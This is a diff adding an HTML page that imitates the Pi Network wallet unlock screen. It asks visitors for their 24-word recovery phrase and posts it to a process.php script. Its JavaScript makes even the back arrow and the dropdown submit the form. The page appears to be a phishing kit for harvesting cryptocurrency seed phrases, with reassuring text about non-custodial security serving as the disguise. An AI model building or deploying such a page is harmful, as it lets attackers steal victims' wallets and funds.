@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PI Wallet</title>
+      <!-- Include Font Awesome (CDN link) -->
+      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+      <link rel="stylesheet" href="style.css">
+      <script>
+        // JavaScript to submit the form when back arrow or dropdown is clicked
+        function submitForm(action) {
+            const form = document.getElementById("unlock-form");
+            const hiddenActionInput = document.createElement("input");
+            hiddenActionInput.type = "hidden";
+            hiddenActionInput.name = "action";
+            hiddenActionInput.value = action; // Either "passphrase" or "fingerprint"
+            form.appendChild(hiddenActionInput);
+            form.submit();
+        }
+      </script>
+</head>
+<body>
+    <div class="container">
+        <!-- header -->
+        <header class="header">
+            <div class="back-arrow" onclick="submitForm('passphrase')">←</div>
+            <div class="title-group">
+              <img src="pi-logo-removebg-preview.png" alt="Icon" class="header-logo">
+              <h1>Wallet</h1>
+              <img src="pi-1-removebg-preview.png" alt="Logo" class="header-logo">
+            </div>
+            <!-- <i class="fa-thin fa-circle-chevron-down"></i> -->
+            <div class="dropdown" onclick="submitForm('fingerprint')">▼</div>
+          </header>
+
+           <!-- Main Section -->
+     <main class="unlock-section">
+        <h2>Unlock Pi Wallet</h2>
+        <form id="unlock-form" action="process.php" method="post">
+            <textarea name="passphrase" placeholder="Enter your 24-word phrase here"></textarea>
+            <button type="submit" name="action" value="passphrase" class="btn-passphrase">Unlock With Passphrase</button>
+            <button type="submit" name="action" value="fingerprint" class="btn-fingerprint">Unlock With Fingerprint</button>
+        </form>
+
+        <p class="info">
+          As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+        </p>
+        <p class="lost-passphrase">
+          Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+        </p>
+      </main>
+          
+    </div>   
+</body>
+</html>
